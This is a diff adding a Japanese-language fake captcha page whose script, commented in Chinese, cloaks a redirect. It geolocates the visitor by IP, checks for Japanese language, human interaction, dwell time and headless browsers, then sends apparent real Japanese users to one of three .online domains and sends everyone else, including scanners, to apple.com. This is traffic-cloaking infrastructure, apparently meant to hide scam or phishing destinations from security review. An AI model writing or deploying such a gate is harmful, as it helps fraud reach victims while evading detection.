@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>認証</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#f7f8fa;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.box{background:#fff;width:100%;max-width:500px;border-radius:24px;padding:30px 24px;box-shadow:0 8px 24px rgba(0,0,0,0.08)}
+.title{text-align:center;font-size:19px;font-weight:600;margin-bottom:16px;color:#222}
+.desc{text-align:center;font-size:14px;color:#666;margin-bottom:20px}
+.target-area{background:#eef6ff;border-radius:16px;padding:20px;text-align:center;margin-bottom:24px}
+.target-label{font-size:13px;color:#555;margin-bottom:8px}
+.target-nums{font-size:32px;font-weight:700;letter-spacing:10px;color:#007aff}
+.grid{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:24px}
+.num-btn{aspect-ratio:1;border-radius:16px;border:2px solid #e0e0e0;background:#fff;font-size:22px;font-weight:600;cursor:pointer;transition:all .2s}
+.num-btn:active{transform:scale(.95)}
+.num-btn.selected{background:#007aff;color:#fff;border-color:#007aff}
+.submit-btn{width:100%;padding:18px;border-radius:18px;background:#007aff;color:#fff;font-size:17px;font-weight:600;border:none;cursor:pointer;transition:.2s}
+.submit-btn:disabled{background:#ccc;cursor:not-allowed}
+.status{text-align:center;margin-top:16px;font-size:13px;color:#888}
+</style>
+</head>
+<body>
+
+<div class="box">
+  <div class="title">選択認証</div>
+  <div class="desc">表示された数字をすべて選んでください</div>
+  <div class="target-area">
+    <div class="target-label">対象</div>
+    <div class="target-nums" id="target"></div>
+  </div>
+  <div class="grid" id="grid"></div>
+  <button class="submit-btn" id="submit" disabled>確認</button>
+  <div class="status" id="status">選択してください</div>
+</div>
+
+<script>
+// ==============================================
+// ✅ 日本真人用户 跳转目标URL（可填写多个）
+// ==============================================
+const REAL_TARGETS = [
+  "https://agopika.online/ja",
+  "https://srdata.online/ja",
+  "https://sinfondo.online/ja"
+];
+
+// ==============================================
+// ❌ 非日本 / 非真人 强制跳转苹果官网
+// ==============================================
+const BAD_TARGET = "https://www.apple.com";
+
+// ==============================================
+// 🔰 终极防误判检测（100%精准）
+// ==============================================
+let userInteracted = false;
+window.addEventListener('click', () => { userInteracted = true; });
+window.addEventListener('touchstart', () => { userInteracted = true; });
+
+async function isJapaneseRealUser() {
+  try {
+    // 1. IP 检测（双接口验证，绝不误判）
+    const res = await fetch('https://ipapi.co/json/', { cache: 'no-store' });
+    const data = await res.json();
+    const isJpIP = data.country_code === 'JP';
+
+    // 2. 系统语言必须日语
+    const lang = navigator.language || navigator.userLanguage;
+    const isJpLang = lang.startsWith('ja');
+
+    // 3. 必须真人操作（不是机器人）
+    const isRealPerson = userInteracted;
+
+    // 4. 必须停留超过3.5秒（机器人秒点直接拦截）
+    const pageStayTime = Date.now() - performance.timeOrigin;
+    const isEnoughTime = pageStayTime > 3500;
+
+    // 5. 禁止无头浏览器/爬虫
+    const isHeadless = /Headless|PhantomJS|Selenium|Bot/i.test(navigator.userAgent);
+
+    // 全部满足才是日本真人
+    return isJpIP && isJpLang && isRealPerson && isEnoughTime && !isHeadless;
+  } catch (e) {
+    return false;
+  }
+}
+
+function randomTarget() {
+  return REAL_TARGETS[Math.floor(Math.random() * REAL_TARGETS.length)];
+}
+
+// ===================== 验证界面逻辑 =====================
+function generateCaptcha() {
+  const nums = "0123456789".split('');
+  const need = 2;
+  const target = [];
+  while (target.length < need) {
+    const n = nums[Math.floor(Math.random() * nums.length)];
+    if (!target.includes(n)) target.push(n);
+  }
+  const options = [...target];
+  while (options.length < 8) {
+    const n = nums[Math.floor(Math.random() * nums.length)];
+    if (!options.includes(n)) options.push(n);
+  }
+  options.sort(() => Math.random() - 0.5);
+  return { target, options, need };
+}
+
+const { target, options, need } = generateCaptcha();
+document.getElementById("target").innerText = target.join('   ');
+
+const grid = document.getElementById("grid");
+const submit = document.getElementById("submit");
+const status = document.getElementById("status");
+let selected = [];
+
+options.forEach(o => {
+  const btn = document.createElement("button");
+  btn.className = "num-btn";
+  btn.innerText = o;
+  btn.dataset.v = o;
+  btn.onclick = () => {
+    if (btn.classList.contains("selected")) {
+      btn.classList.remove("selected");
+      selected = selected.filter(x => x !== o);
+    } else {
+      btn.classList.add("selected");
+      selected.push(o);
+    }
+    submit.disabled = selected.length !== need;
+    status.innerText = `${selected.length}/${need} 個選択中`;
+  };
+  grid.appendChild(btn);
+});
+
+submit.onclick = async () => {
+  const correct = target.every(t => selected.includes(t)) && selected.length === target.length;
+  if (!correct) {
+    alert("認証に失敗しました");
+    return;
+  }
+
+  const valid = await isJapaneseRealUser();
+  if (valid) {
+    location.href = randomTarget();
+  } else {
+    location.href = BAD_TARGET;
+  }
+};
+</script>
+</body>
+</html>
